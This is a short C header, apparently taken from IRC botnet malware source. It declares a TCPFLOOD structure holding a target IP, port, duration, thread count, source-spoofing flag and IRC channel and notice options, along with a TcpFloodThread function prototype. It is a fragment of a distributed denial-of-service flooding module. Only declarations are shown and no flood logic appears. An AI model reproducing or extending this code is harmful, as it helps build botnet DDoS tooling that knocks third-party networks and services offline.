#ifndef NO_TCP
typedef struct TCPFLOOD {

	SOCKET sock;
	char ip[128];
	char type[128];
	char chan[128];
	int threadnum;
	int port;
	int time;
	bool spoof;
	bool notice;
	bool silent;
	bool gotinfo;

} TCPFLOOD;

DWORD WINAPI TcpFloodThread(LPVOID param);
#endif
